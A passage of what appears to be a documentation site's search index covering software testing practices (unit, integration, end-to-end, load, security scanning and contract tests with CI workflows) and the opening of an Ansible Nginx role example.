});\n\n  afterEach(() =&gt; {\n    jest.clearAllMocks();\n  });\n\n  describe('add', () =&gt; {\n    it('should add two numbers correctly', () =&gt; {\n      const result = calculator.add(2, 3);\n      expect(result).toBe(5);\n    });\n\n    it.each([\n      [1, 1, 2],\n      [2, 3, 5],\n      [-1, 1, 0],\n      [0, 0, 0],\n    ])('should add %i and %i to equal %i', (a, b, expected) =&gt; {\n      expect(calculator.add(a, b)).toBe(expected);\n    });\n  });\n\n  describe('divide', () =&gt; {\n    it('should divide two numbers correctly', () =&gt; {\n      const result = calculator.divide(10, 2);\n      expect(result).toBe(5);\n    });\n\n    it('should throw error when dividing by zero', () =&gt; {\n      expect(() =&gt; calculator.divide(10, 0)).toThrow('Cannot divide by zero');\n    });\n  });\n});\n</code></pre> <p>Mocking example:</p> <pre><code>// tests/user-service.test.ts\nimport { UserService } from '../src/user-service';\nimport { UserRepository } from '../src/user-repository';\n\njest.mock('../src/user-repository');\n\ndescribe('UserService', () =&gt; {\n  let userService: UserService;\n  let mockUserRepository: jest.Mocked&lt;UserRepository&gt;;\n\n  beforeEach(() =&gt; {\n    mockUserRepository = new UserRepository() as jest.Mocked&lt;UserRepository&gt;;\n    userService = new UserService(mockUserRepository);\n  });\n\n  it('should get user by id', async () =&gt; {\n    const mockUser = { id: 1, name: 'John' };\n    mockUserRepository.findById.mockResolvedValue(mockUser);\n\n    const result = await userService.getUser(1);\n\n    expect(result).toEqual(mockUser);\n    expect(mockUserRepository.findById).toHaveBeenCalledWith(1);\n  });\n});\n</code></pre> <p>Run tests:</p> <pre><code>## Run all tests\nnpm test\n\n## Run with coverage\nnpm test -- --coverage\n\n## Run in watch mode\nnpm test -- --watch\n\n## Run specific test\nnpm test -- calculator.test.ts\n\n## Update snapshots\nnpm test -- -u\n</code></pre>","tags":["testing","unit-tests","integration-tests","e2e","performance","automation","tdd","bdd"]},{"location":"05_ci_cd/testing_strategies/#go-testing-package","title":"Go (testing package)","text":"<p>Example test:</p> <pre><code>// calculator_test.go\npackage calculator\n\nimport (\n    \"testing\"\n)\n\nfunc TestAdd(t *testing.T) {\n    tests := []struct {\n        name     string\n        a, b     int\n        expected int\n    }{\n        {\"positive numbers\", 2, 3, 5},\n        {\"negative numbers\", -1, -1, -2},\n        {\"zero\", 0, 0, 0},\n    }\n\n    for _, tt := range tests {\n        t.Run(tt.name, func(t *testing.T) {\n            result := Add(tt.a, tt.b)\n            if result != tt.expected {\n                t.Errorf(\"Add(%d, %d) = %d; want %d\",\n                    tt.a, tt.b, result, tt.expected)\n            }\n        })\n    }\n}\n\nfunc BenchmarkAdd(b *testing.B) {\n    for i := 0; i &lt; b.N; i++ {\n        Add(2, 3)\n    }\n}\n</code></pre> <p>Run tests:</p> <pre><code>## Run all tests\ngo test ./...\n\n## Run with coverage\ngo test -cover ./...\ngo test -coverprofile=coverage.out ./...\ngo tool cover -html=coverage.out\n\n## Run benchmarks\ngo test -bench=. ./...\n\n## Run with race detector\ngo test -race ./...\n</code></pre>","tags":["testing","unit-tests","integration-tests","e2e","performance","automation","tdd","bdd"]},{"location":"05_ci_cd/testing_strategies/#integration-testing","title":"Integration Testing","text":"","tags":["testing","unit-tests","integration-tests","e2e","performance","automation","tdd","bdd"]},{"location":"05_ci_cd/testing_strategies/#database-integration-python","title":"Database Integration (Python)","text":"<p>Using testcontainers:</p> <pre><code>## tests/integration/test_user_repository.py\nimport pytest\nfrom testcontainers.postgres import PostgresContainer\nfrom sqlalchemy import create_engine\nfrom sqlalchemy.orm import sessionmaker\n\nfrom src.models import Base, User\nfrom src.repositories import UserRepository\n\n@pytest.fixture(scope=\"module\")\ndef postgres_container():\n    \"\"\"Start PostgreSQL container for testing.\"\"\"\n    with PostgresContainer(\"postgres:15-alpine\") as postgres:\n        yield postgres\n\n@pytest.fixture(scope=\"module\")\ndef db_engine(postgres_container):\n    \"\"\"Create database engine.\"\"\"\n    engine = create_engine(postgres_container.get_connection_url())\n    Base.metadata.create_all(engine)\n    yield engine\n    Base.metadata.drop_all(engine)\n\n@pytest.fixture\ndef db_session(db_engine):\n    \"\"\"Create database session for each test.\"\"\"\n    Session = sessionmaker(bind=db_engine)\n    session = Session()\n    yield session\n    session.rollback()\n    session.close()\n\nclass TestUserRepository:\n    \"\"\"Integration tests for UserRepository.\"\"\"\n\n    def test_create_user(self, db_session):\n        \"\"\"Test creating a user in database.\"\"\"\n        repo = UserRepository(db_session)\n        user = repo.create(name=\"John Doe\", email=\"john@example.com\")\n\n        assert user.id is not None\n        assert user.name == \"John Doe\"\n        assert user.email == \"john@example.com\"\n\n    def test_find_user_by_email(self, db_session):\n        \"\"\"Test finding user by email.\"\"\"\n        repo = UserRepository(db_session)\n        repo.create(name=\"Jane Doe\", email=\"jane@example.com\")\n\n        user = repo.find_by_email(\"jane@example.com\")\n\n        assert user is not None\n        assert user.name == \"Jane Doe\"\n</code></pre>","tags":["testing","unit-tests","integration-tests","e2e","performance","automation","tdd","bdd"]},{"location":"05_ci_cd/testing_strategies/#api-integration-typescript","title":"API Integration (TypeScript)","text":"<p>Using supertest:</p> <pre><code>// tests/integration/user-api.test.ts\nimport request from 'supertest';\nimport { App } from '../../src/app';\nimport { Database } from '../../src/database';\n\ndescribe('User API Integration Tests', () =&gt; {\n  let app: Express.Application;\n  let db: Database;\n\n  beforeAll(async () =&gt; {\n    db = await Database.connect(process.env.TEST_DATABASE_URL);\n    app = new App(db).express;\n  });\n\n  afterAll(async () =&gt; {\n    await db.disconnect();\n  });\n\n  beforeEach(async () =&gt; {\n    await db.clear();\n  });\n\n  describe('POST /api/users', () =&gt; {\n    it('should create a new user', async () =&gt; {\n      const response = await request(app)\n        .post('/api/users')\n        .send({\n          name: 'John Doe',\n          email: 'john@example.com',\n        })\n        .expect(201);\n\n      expect(response.body).toMatchObject({\n        name: 'John Doe',\n        email: 'john@example.com',\n      });\n      expect(response.body.id).toBeDefined();\n    });\n\n    it('should return 400 for invalid email', async () =&gt; {\n      await request(app)\n        .post('/api/users')\n        .send({\n          name: 'John Doe',\n          email: 'invalid-email',\n        })\n        .expect(400);\n    });\n  });\n\n  describe('GET /api/users/:id', () =&gt; {\n    it('should get user by id', async () =&gt; {\n      const createResponse = await request(app)\n        .post('/api/users')\n        .send({ name: 'Jane Doe', email: 'jane@example.com' });\n\n      const userId = createResponse.body.id;\n\n      const response = await request(app)\n        .get(`/api/users/${userId}`)\n        .expect(200);\n\n      expect(response.body).toMatchObject({\n        id: userId,\n        name: 'Jane Doe',\n        email: 'jane@example.com',\n      });\n    });\n  });\n});\n</code></pre>","tags":["testing","unit-tests","integration-tests","e2e","performance","automation","tdd","bdd"]},{"location":"05_ci_cd/testing_strategies/#docker-compose-integration","title":"Docker Compose Integration","text":"<p>docker-compose.test.yml:</p> <pre><code>version: '3.8'\n\nservices:\n  postgres:\n    image: postgres:15-alpine\n    environment:\n      POSTGRES_USER: testuser\n      POSTGRES_PASSWORD: testpass\n      POSTGRES_DB: testdb\n    ports:\n      - \"5432:5432\"\n\n  redis:\n    image: redis:7-alpine\n    ports:\n      - \"6379:6379\"\n\n  api:\n    build:\n      context: .\n      dockerfile: Dockerfile\n    environment:\n      DATABASE_URL: postgresql://testuser:testpass@postgres:5432/testdb\n      REDIS_URL: redis://redis:6379\n    depends_on:\n      - postgres\n      - redis\n    command: npm test\n\n  api-tests:\n    build:\n      context: .\n      dockerfile: Dockerfile.test\n    environment:\n      API_URL: http://api:3000\n    depends_on:\n      - api\n    command: npm run test:integration\n</code></pre> <p>Run integration tests:</p> <pre><code>## Start services and run tests\ndocker-compose -f docker-compose.test.yml up --abort-on-container-exit\n\n## Cleanup\ndocker-compose -f docker-compose.test.yml down -v\n</code></pre>","tags":["testing","unit-tests","integration-tests","e2e","performance","automation","tdd","bdd"]},{"location":"05_ci_cd/testing_strategies/#end-to-end-testing","title":"End-to-End Testing","text":"","tags":["testing","unit-tests","integration-tests","e2e","performance","automation","tdd","bdd"]},{"location":"05_ci_cd/testing_strategies/#playwright-web","title":"Playwright (Web)","text":"<p>Installation:</p> <pre><code>npm install --save-dev @playwright/test\nnpx playwright install\n</code></pre> <p>playwright.config.ts:</p> <pre><code>import { defineConfig, devices } from '@playwright/test';\n\nexport default defineConfig({\n  testDir: './tests/e2e',\n  fullyParallel: true,\n  forbidOnly: !!process.env.CI,\n  retries: process.env.CI ? 2 : 0,\n  workers: process.env.CI ? 1 : undefined,\n  reporter: [\n    ['html'],\n    ['junit', { outputFile: 'test-results/junit.xml' }],\n  ],\n  use: {\n    baseURL: 'http://localhost:3000',\n    trace: 'on-first-retry',\n    screenshot: 'only-on-failure',\n  },\n  projects: [\n    {\n      name: 'chromium',\n      use: { ...devices['Desktop Chrome'] },\n    },\n    {\n      name: 'firefox',\n      use: { ...devices['Desktop Firefox'] },\n    },\n    {\n      name: 'webkit',\n      use: { ...devices['Desktop Safari'] },\n    },\n    {\n      name: 'Mobile Chrome',\n      use: { ...devices['Pixel 5'] },\n    },\n  ],\n  webServer: {\n    command: 'npm run start',\n    url: 'http://localhost:3000',\n    reuseExistingServer: !process.env.CI,\n  },\n});\n</code></pre> <p>Example E2E test:</p> <pre><code>// tests/e2e/login.spec.ts\nimport { test, expect } from '@playwright/test';\n\ntest.describe('Login Flow', () =&gt; {\n  test.beforeEach(async ({ page }) =&gt; {\n    await page.goto('/login');\n  });\n\n  test('should login successfully with valid credentials', async ({ page }) =&gt; {\n    await page.fill('input[name=\"email\"]', 'user@example.com');\n    await page.fill('input[name=\"password\"]', 'password123');\n    await page.click('button[type=\"submit\"]');\n\n    await expect(page).toHaveURL('/dashboard');\n    await expect(page.locator('h1')).toHaveText('Dashboard');\n  });\n\n  test('should show error with invalid credentials', async ({ page }) =&gt; {\n    await page.fill('input[name=\"email\"]', 'user@example.com');\n    await page.fill('input[name=\"password\"]', 'wrongpassword');\n    await page.click('button[type=\"submit\"]');\n\n    await expect(page.locator('.error')).toHaveText('Invalid credentials');\n  });\n\n  test('should validate required fields', async ({ page }) =&gt; {\n    await page.click('button[type=\"submit\"]');\n\n    await expect(page.locator('input[name=\"email\"]:invalid')).toBeVisible();\n    await expect(page.locator('input[name=\"password\"]:invalid')).toBeVisible();\n  });\n});\n</code></pre> <p>Page Object Model:</p> <pre><code>// tests/e2e/pages/login.page.ts\nimport { Page } from '@playwright/test';\n\nexport class LoginPage {\n  constructor(private page: Page) {}\n\n  async goto() {\n    await this.page.goto('/login');\n  }\n\n  async login(email: string, password: string) {\n    await this.page.fill('input[name=\"email\"]', email);\n    await this.page.fill('input[name=\"password\"]', password);\n    await this.page.click('button[type=\"submit\"]');\n  }\n\n  async getErrorMessage() {\n    return this.page.locator('.error').textContent();\n  }\n}\n\n// Usage in test\nimport { LoginPage } from './pages/login.page';\n\ntest('should login with page object', async ({ page }) =&gt; {\n  const loginPage = new LoginPage(page);\n  await loginPage.goto();\n  await loginPage.login('user@example.com', 'password123');\n  await expect(page).toHaveURL('/dashboard');\n});\n</code></pre> <p>Run tests:</p> <pre><code>## Run all E2E tests\nnpx playwright test\n\n## Run in headed mode\nnpx playwright test --headed\n\n## Run specific browser\nnpx playwright test --project=chromium\n\n## Debug mode\nnpx playwright test --debug\n\n## Show report\nnpx playwright show-report\n</code></pre>","tags":["testing","unit-tests","integration-tests","e2e","performance","automation","tdd","bdd"]},{"location":"05_ci_cd/testing_strategies/#cypress-alternative","title":"Cypress (Alternative)","text":"<p>Installation:</p> <pre><code>npm install --save-dev cypress\nnpx cypress open\n</code></pre> <p>cypress.config.ts:</p> <pre><code>import { defineConfig } from 'cypress';\n\nexport default defineConfig({\n  e2e: {\n    baseUrl: 'http://localhost:3000',\n    setupNodeEvents(on, config) {\n      // implement node event listeners here\n    },\n    video: false,\n    screenshotOnRunFailure: true,\n  },\n});\n</code></pre> <p>Example test:</p> <pre><code>// cypress/e2e/login.cy.ts\ndescribe('Login Flow', () =&gt; {\n  beforeEach(() =&gt; {\n    cy.visit('/login');\n  });\n\n  it('should login successfully', () =&gt; {\n    cy.get('input[name=\"email\"]').type('user@example.com');\n    cy.get('input[name=\"password\"]').type('password123');\n    cy.get('button[type=\"submit\"]').click();\n\n    cy.url().should('include', '/dashboard');\n    cy.get('h1').should('contain', 'Dashboard');\n  });\n\n  it('should show error for invalid credentials', () =&gt; {\n    cy.get('input[name=\"email\"]').type('user@example.com');\n    cy.get('input[name=\"password\"]').type('wrongpassword');\n    cy.get('button[type=\"submit\"]').click();\n\n    cy.get('.error').should('be.visible').and('contain', 'Invalid credentials');\n  });\n});\n</code></pre>","tags":["testing","unit-tests","integration-tests","e2e","performance","automation","tdd","bdd"]},{"location":"05_ci_cd/testing_strategies/#performance-testing","title":"Performance Testing","text":"","tags":["testing","unit-tests","integration-tests","e2e","performance","automation","tdd","bdd"]},{"location":"05_ci_cd/testing_strategies/#k6-load-testing","title":"k6 (Load Testing)","text":"<p>Installation:</p> <pre><code>## macOS\nbrew install k6\n\n## Linux\nwget https://github.com/grafana/k6/releases/download/v0.48.0/k6-v0.48.0-linux-amd64.tar.gz\ntar -xzf k6-v0.48.0-linux-amd64.tar.gz\nsudo mv k6-v0.48.0-linux-amd64/k6 /usr/local/bin/\n</code></pre> <p>Example load test:</p> <pre><code>// tests/load/api-load-test.js\nimport http from 'k6/http';\nimport { check, sleep } from 'k6';\nimport { Rate, Trend } from 'k6/metrics';\n\n// Custom metrics\nconst errorRate = new Rate('errors');\nconst apiTrend = new Trend('api_duration');\n\n// Test configuration\nexport const options = {\n  stages: [\n    { duration: '1m', target: 50 },   // Ramp up to 50 users\n    { duration: '3m', target: 50 },   // Stay at 50 users\n    { duration: '1m', target: 100 },  // Ramp up to 100 users\n    { duration: '3m', target: 100 },  // Stay at 100 users\n    { duration: '1m', target: 0 },    // Ramp down to 0 users\n  ],\n  thresholds: {\n    http_req_duration: ['p(95)&lt;500', 'p(99)&lt;1000'],\n    http_req_failed: ['rate&lt;0.01'],\n    errors: ['rate&lt;0.1'],\n  },\n};\n\nexport default function () {\n  const url = 'https://api.example.com/users';\n  const params = {\n    headers: {\n      'Content-Type': 'application/json',\n    },\n  };\n\n  const response = http.get(url, params);\n\n  const success = check(response, {\n    'status is 200': (r) =&gt; r.status === 200,\n    'response time &lt; 500ms': (r) =&gt; r.timings.duration &lt; 500,\n    'response has data': (r) =&gt; r.json('data') !== undefined,\n  });\n\n  errorRate.add(!success);\n  apiTrend.add(response.timings.duration);\n\n  sleep(1);\n}\n</code></pre> <p>Run load test:</p> <pre><code>## Run test\nk6 run tests/load/api-load-test.js\n\n## Run with specific VUs and duration\nk6 run --vus 100 --duration 30s tests/load/api-load-test.js\n\n## Output to InfluxDB\nk6 run --out influxdb=http://localhost:8086/mydb tests/load/api-load-test.js\n</code></pre>","tags":["testing","unit-tests","integration-tests","e2e","performance","automation","tdd","bdd"]},{"location":"05_ci_cd/testing_strategies/#apache-jmeter","title":"Apache JMeter","text":"<p>Installation:</p> <pre><code>## macOS\nbrew install jmeter\n\n## Manual download\nwget https://dlcdn.apache.org//jmeter/binaries/apache-jmeter-5.6.2.tgz\ntar -xzf apache-jmeter-5.6.2.tgz\n</code></pre> <p>Run JMeter:</p> <pre><code>## GUI mode\njmeter\n\n## CLI mode\njmeter -n -t test-plan.jmx -l results.jtl -e -o report/\n\n## With variables\njmeter -n -t test-plan.jmx -Jusers=100 -Jduration=300\n</code></pre>","tags":["testing","unit-tests","integration-tests","e2e","performance","automation","tdd","bdd"]},{"location":"05_ci_cd/testing_strategies/#locust-python","title":"Locust (Python)","text":"<p>Installation:</p> <pre><code>pip install locust\n</code></pre> <p>locustfile.py:</p> <pre><code>from locust import HttpUser, task, between\n\nclass WebsiteUser(HttpUser):\n    wait_time = between(1, 3)\n\n    @task(3)\n    def view_items(self):\n        \"\"\"View items endpoint (higher weight).\"\"\"\n        self.client.get(\"/api/items\")\n\n    @task(1)\n    def view_item(self):\n        \"\"\"View single item.\"\"\"\n        item_id = 1\n        self.client.get(f\"/api/items/{item_id}\")\n\n    @task(2)\n    def create_item(self):\n        \"\"\"Create new item.\"\"\"\n        self.client.post(\"/api/items\", json={\n            \"name\": \"Test Item\",\n            \"description\": \"Test Description\"\n        })\n\n    def on_start(self):\n        \"\"\"Login before starting tasks.\"\"\"\n        self.client.post(\"/api/login\", json={\n            \"email\": \"user@example.com\",\n            \"password\": \"password123\"\n        })\n</code></pre> <p>Run Locust:</p> <pre><code>## Web UI\nlocust -f locustfile.py --host=https://api.example.com\n\n## Headless\nlocust -f locustfile.py \\\n  --host=https://api.example.com \\\n  --users 100 \\\n  --spawn-rate 10 \\\n  --run-time 5m \\\n  --headless\n</code></pre>","tags":["testing","unit-tests","integration-tests","e2e","performance","automation","tdd","bdd"]},{"location":"05_ci_cd/testing_strategies/#security-testing","title":"Security Testing","text":"","tags":["testing","unit-tests","integration-tests","e2e","performance","automation","tdd","bdd"]},{"location":"05_ci_cd/testing_strategies/#owasp-zap-api-testing","title":"OWASP ZAP (API Testing)","text":"<p>zap-api-scan.yaml:</p> <pre><code>## ZAP API scan configuration\nenv:\n  contexts:\n    - name: api-context\n      urls:\n        - https://api.example.com\n      includePaths:\n        - https://api.example.com/api/.*\n      excludePaths:\n        - https://api.example.com/api/health\n\n  vars:\n    apiKey: ${API_KEY}\n\njobs:\n  - type: openapi\n    parameters:\n      apiFile: openapi.yaml\n      apiUrl: https://api.example.com\n      targetUrl: https://api.example.com\n\n  - type: passiveScan-config\n    parameters:\n      maxAlertsPerRule: 10\n\n  - type: activeScan\n    parameters:\n      context: api-context\n      policy: API-Scan\n</code></pre> <p>Run scan:</p> <pre><code>docker run -v $(pwd):/zap/wrk/:rw \\\n  zaproxy/zap-stable \\\n  zap-api-scan.py \\\n  -t https://api.example.com/openapi.json \\\n  -f openapi \\\n  -c zap-api-scan.yaml \\\n  -r zap-api-report.html\n</code></pre>","tags":["testing","unit-tests","integration-tests","e2e","performance","automation","tdd","bdd"]},{"location":"05_ci_cd/testing_strategies/#test-automation","title":"Test Automation","text":"","tags":["testing","unit-tests","integration-tests","e2e","performance","automation","tdd","bdd"]},{"location":"05_ci_cd/testing_strategies/#contract-testing-pact","title":"Contract Testing (Pact)","text":"<p>Consumer test (TypeScript):</p> <pre><code>// tests/contract/user-service.pact.ts\nimport { PactV3, MatchersV3 } from '@pact-foundation/pact';\nimport { UserService } from '../../src/user-service';\n\nconst provider = new PactV3({\n  consumer: 'UserServiceConsumer',\n  provider: 'UserAPI',\n});\n\ndescribe('User Service Contract', () =&gt; {\n  it('should get user by id', async () =&gt; {\n    await provider\n      .given('user 1 exists')\n      .uponReceiving('a request for user 1')\n      .withRequest({\n        method: 'GET',\n        path: '/api/users/1',\n        headers: {\n          Accept: 'application/json',\n        },\n      })\n      .willRespondWith({\n        status: 200,\n        headers: {\n          'Content-Type': 'application/json',\n        },\n        body: {\n          id: MatchersV3.integer(1),\n          name: MatchersV3.string('John Doe'),\n          email: MatchersV3.regex('john@example.com', '\\\\S+@\\\\S+'),\n        },\n      })\n      .executeTest(async (mockServer) =&gt; {\n        const userService = new UserService(mockServer.url);\n        const user = await userService.getUser(1);\n\n        expect(user).toMatchObject({\n          id: 1,\n          name: 'John Doe',\n          email: 'john@example.com',\n        });\n      });\n  });\n});\n</code></pre>","tags":["testing","unit-tests","integration-tests","e2e","performance","automation","tdd","bdd"]},{"location":"05_ci_cd/testing_strategies/#mutation-testing-python-mutmut","title":"Mutation Testing (Python - mutmut)","text":"<p>Installation:</p> <pre><code>pip install mutmut\n</code></pre> <p>Configuration (.mutmut.toml):</p> <pre><code>[mutmut]\npaths_to_mutate = src/\ntests_dir = tests/\nrunner = pytest\n</code></pre> <p>Run mutation testing:</p> <pre><code>## Run mutation tests\nmutmut run\n\n## Show results\nmutmut results\n\n## Show surviving mutants\nmutmut show\n</code></pre>","tags":["testing","unit-tests","integration-tests","e2e","performance","automation","tdd","bdd"]},{"location":"05_ci_cd/testing_strategies/#cicd-integration","title":"CI/CD Integration","text":"","tags":["testing","unit-tests","integration-tests","e2e","performance","automation","tdd","bdd"]},{"location":"05_ci_cd/testing_strategies/#github-actions-complete-test-suite","title":"GitHub Actions - Complete Test Suite","text":"<pre><code>name: Test Suite\n\non:\n  push:\n    branches: [main, develop]\n  pull_request:\n    branches: [main]\n\njobs:\n  unit-tests:\n    runs-on: ubuntu-latest\n    strategy:\n      matrix:\n        python-version: ['3.10', '3.11', '3.12']\n    steps:\n      - uses: actions/checkout@v4\n\n      - uses: actions/setup-python@v5\n        with:\n          python-version: ${{ matrix.python-version }}\n\n      - name: Install dependencies\n        run: |\n          pip install -e .[test]\n\n      - name: Run unit tests\n        run: |\n          pytest tests/unit -v --cov=src --cov-report=xml\n\n      - name: Upload coverage\n        uses: codecov/codecov-action@v3\n        with:\n          files: ./coverage.xml\n\n  integration-tests:\n    runs-on: ubuntu-latest\n    services:\n      postgres:\n        image: postgres:15\n        env:\n          POSTGRES_PASSWORD: postgres\n        options: &gt;-\n          --health-cmd pg_isready\n          --health-interval 10s\n          --health-timeout 5s\n          --health-retries 5\n      redis:\n        image: redis:7\n        options: &gt;-\n          --health-cmd \"redis-cli ping\"\n          --health-interval 10s\n          --health-timeout 5s\n          --health-retries 5\n    steps:\n      - uses: actions/checkout@v4\n\n      - uses: actions/setup-python@v5\n        with:\n          python-version: '3.11'\n\n      - name: Run integration tests\n        env:\n          DATABASE_URL: postgresql://postgres:postgres@localhost:5432/testdb\n          REDIS_URL: redis://localhost:6379\n        run: |\n          pytest tests/integration -v\n\n  e2e-tests:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n\n      - uses: actions/setup-node@v4\n        with:\n          node-version: '20'\n\n      - name: Install dependencies\n        run: npm ci\n\n      - name: Install Playwright\n        run: npx playwright install --with-deps\n\n      - name: Run E2E tests\n        run: npx playwright test\n\n      - name: Upload test results\n        if: always()\n        uses: actions/upload-artifact@v3\n        with:\n          name: playwright-report\n          path: playwright-report/\n\n  performance-tests:\n    runs-on: ubuntu-latest\n    if: github.event_name == 'push' &amp;&amp; github.ref == 'refs/heads/main'\n    steps:\n      - uses: actions/checkout@v4\n\n      - name: Run k6 load test\n        uses: grafana/k6-action@v0.3.1\n        with:\n          filename: tests/load/api-load-test.js\n\n      - name: Upload results\n        uses: actions/upload-artifact@v3\n        with:\n          name: k6-results\n          path: summary.json\n</code></pre>","tags":["testing","unit-tests","integration-tests","e2e","performance","automation","tdd","bdd"]},{"location":"05_ci_cd/testing_strategies/#best-practices","title":"Best Practices","text":"","tags":["testing","unit-tests","integration-tests","e2e","performance","automation","tdd","bdd"]},{"location":"05_ci_cd/testing_strategies/#test-organization","title":"Test Organization","text":"<p>Directory structure:</p> <pre><code>tests/\n\u251c\u2500\u2500 unit/                    # Unit tests\n\u2502   \u251c\u2500\u2500 test_calculator.py\n\u2502   \u2514\u2500\u2500 test_validator.py\n\u251c\u2500\u2500 integration/             # Integration tests\n\u2502   \u251c\u2500\u2500 test_database.py\n\u2502   \u2514\u2500\u2500 test_api.py\n\u251c\u2500\u2500 e2e/                     # End-to-end tests\n\u2502   \u251c\u2500\u2500 login.spec.ts\n\u2502   \u2514\u2500\u2500 checkout.spec.ts\n\u251c\u2500\u2500 load/                    # Performance tests\n\u2502   \u2514\u2500\u2500 api-load-test.js\n\u251c\u2500\u2500 fixtures/                # Test data\n\u2502   \u2514\u2500\u2500 users.json\n\u251c\u2500\u2500 helpers/                 # Test utilities\n\u2502   \u2514\u2500\u2500 test-helpers.ts\n\u2514\u2500\u2500 conftest.py             # Pytest configuration\n</code></pre>","tags":["testing","unit-tests","integration-tests","e2e","performance","automation","tdd","bdd"]},{"location":"05_ci_cd/testing_strategies/#test-naming-conventions","title":"Test Naming Conventions","text":"<pre><code>## Good naming\ndef test_user_creation_with_valid_email_succeeds():\n    pass\n\ndef test_division_by_zero_raises_value_error():\n    pass\n\n## Poor naming\ndef test_user():\n    pass\n\ndef test_1():\n    pass\n</code></pre>","tags":["testing","unit-tests","integration-tests","e2e","performance","automation","tdd","bdd"]},{"location":"05_ci_cd/testing_strategies/#aaa-pattern-arrange-act-assert","title":"AAA Pattern (Arrange-Act-Assert)","text":"<pre><code>def test_user_login():\n    # Arrange\n    user = User(email=\"test@example.com\", password=\"password123\")\n    auth_service = AuthService()\n\n    # Act\n    result = auth_service.login(user.email, user.password)\n\n    # Assert\n    assert result.success is True\n    assert result.token is not None\n</code></pre>","tags":["testing","unit-tests","integration-tests","e2e","performance","automation","tdd","bdd"]},{"location":"05_ci_cd/testing_strategies/#test-independence","title":"Test Independence","text":"<pre><code>## Good - Each test is independent\ndef test_create_user():\n    user = create_user(\"test@example.com\")\n    assert user.email == \"test@example.com\"\n\ndef test_delete_user():\n    user = create_user(\"delete@example.com\")\n    delete_user(user.id)\n    assert get_user(user.id) is None\n\n## Bad - Tests depend on execution order\ndef test_create_user():\n    global user_id\n    user = create_user(\"test@example.com\")\n    user_id = user.id\n\ndef test_delete_user():\n    delete_user(user_id)  # Depends on previous test\n</code></pre>","tags":["testing","unit-tests","integration-tests","e2e","performance","automation","tdd","bdd"]},{"location":"05_ci_cd/testing_strategies/#coverage-goals","title":"Coverage Goals","text":"<ul> <li>Statements: 80% minimum</li> <li>Branches: 75% minimum</li> <li>Functions: 80% minimum</li> <li>Lines: 80% minimum</li> </ul>","tags":["testing","unit-tests","integration-tests","e2e","performance","automation","tdd","bdd"]},{"location":"05_ci_cd/testing_strategies/#continuous-testing","title":"Continuous Testing","text":"<ol> <li>Run tests locally before pushing</li> <li>Run tests in CI on every push</li> <li>Block merges if tests fail</li> <li>Monitor test execution time</li> <li>Review flaky tests regularly</li> </ol>","tags":["testing","unit-tests","integration-tests","e2e","performance","automation","tdd","bdd"]},{"location":"05_ci_cd/testing_strategies/#resources","title":"Resources","text":"<ul> <li>pytest Documentation</li> <li>Jest Documentation</li> <li>Playwright Documentation</li> <li>k6 Documentation</li> <li>Testing Best Practices</li> </ul> <p>Next Steps:</p> <ul> <li>Review the CI/CD Integration for automated testing</li> <li>See Security Scanning Guide for security testing</li> <li>Check Pre-commit Hooks Guide for local test execution</li> </ul>","tags":["testing","unit-tests","integration-tests","e2e","performance","automation","tdd","bdd"]},{"location":"05_examples/ansible_role_example/","title":"Complete Ansible Role Example","text":"","tags":["ansible","role","example","nginx","best-practices","complete"]},{"location":"05_examples/ansible_role_example/#overview","title":"Overview","text":"<p>This is a complete, production-ready Ansible role called ansible-role-nginx that installs and configures Nginx web server with SSL support. It demonstrates all best practices for Ansible role development including multi-OS support, templating, handlers, and automated testing with Molecule.</p> <p>Role Purpose: Install and configure Nginx with SSL certificates, virtual hosts, and security hardening.</p>","tags":["ansible","role","example","nginx","best-practices","complete"]},{"location":"05_examples/ansible_role_example/#role-structure","title":"Role Structure","text":"<pre><code>ansible-role-nginx/\n\u251c\u2500\u2500 README.md\n\u251c\u2500\u2500 meta/\n\u2502   \u2514\u2500\u2500 main.yml\n\u251c\u2500\u2500 defaults/\n\u2502   \u2514\u2500\u2500 main.yml\n\u251c\u2500\u2500 vars/\n\u2502   \u251c\u2500\u2500 Debian.yml\n\u2502   \u2514\u2500\u2500 RedHat.yml\n\u251c\u2500\u2500 tasks/\n\u2502   \u251c\u2500\u2500 main.yml\n\u2502   \u251c\u2500\u2500 install.yml\n\u2502   \u251c\u2500\u2500 configure.yml\n\u2502   \u251c\u2500\u2500 ssl.yml\n\u2502   \u2514\u2500\u2500 security.yml\n\u251c\u2500\u2500 handlers/\n\u2502   \u2514\u2500\u2500 main.yml\n\u251c\u2500\u2500 templates/\n\u2502   \u251c\u2500\u2500 nginx.conf.j2\n\u2502   \u251c\u2500\u2500 site.conf.j2\n\u2502   \u2514\u2500\u2500 ssl.conf.j2\n\u251c\u2500\u2500 files/\n\u2502   \u2514\u2500\u2500 .gitkeep\n\u251c\u2500\u2500 molecule/\n\u2502   \u2514\u2500\u2500 default/\n\u2502       \u251c\u2500\u2500 molecule.yml\n\u2502       \u251c\u2500\u2500 converge.yml\n\u2502       \u2514\u2500\u2500 verify.yml\n\u2514\u2500\u2500 .yamllint\n</code></pre>","tags":["ansible","role","example","nginx","best-practices","complete"]},{"location":"05_examples/ansible_role_example/#readmemd","title":"README.md","text":"<pre><code>## Ansible Role: Nginx\n\n[![CI](https://github.com/yourusername/ansible-role-nginx/workflows/CI/badge.svg)](https://github.com/yourusername/ansible-role-nginx/actions)\n[![Ansible Galaxy](https://img.shields.io/badge/galaxy-yourusername.nginx-blue.svg)](https://galaxy.ansible.com/yourusername/nginx)\n\nAnsible role for installing and configuring Nginx web server with SSL support.\n\n## Requirements\n\n- Ansible &gt;= 2.10\n- Supported platforms:\n  - Ubuntu 20.04, 22.04\n  - Debian 11, 12\n  - RHEL/CentOS 8, 9\n  - Rocky Linux 8, 9\n\n## Role Variables\n\nAvailable variables are listed below, along with default values (see `defaults/main.yml`):\n\n\\```yaml\n## Nginx version (use 'latest' or specific version)\nnginx_version: latest\n\n## Enable/disable nginx service\nnginx_enabled: true\nnginx_state: started\n\n## Nginx user and group\nnginx_user: www-data\nnginx_group: www-data\n\n## Performance tuning\nnginx_worker_processes: auto\nnginx_worker_connections: 1024\n\n## SSL configuration\nnginx_ssl_enabled: true\nnginx_ssl_protocols: \"TLSv1.2 TLSv1.3\"\nnginx_ssl_ciphers: \"ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256\"\n\n## Virtual hosts\nnginx_sites: []\n##  - name: example.com\n##    server_name: example.com www.example.com\n##    root: /var/www/example.com\n##    ssl_enabled: true\n##    ssl_certificate: /etc/ssl/certs/example.com.crt\n##    ssl_certificate_key: /etc/ssl/private/example.com.key\n\\```\n\n## 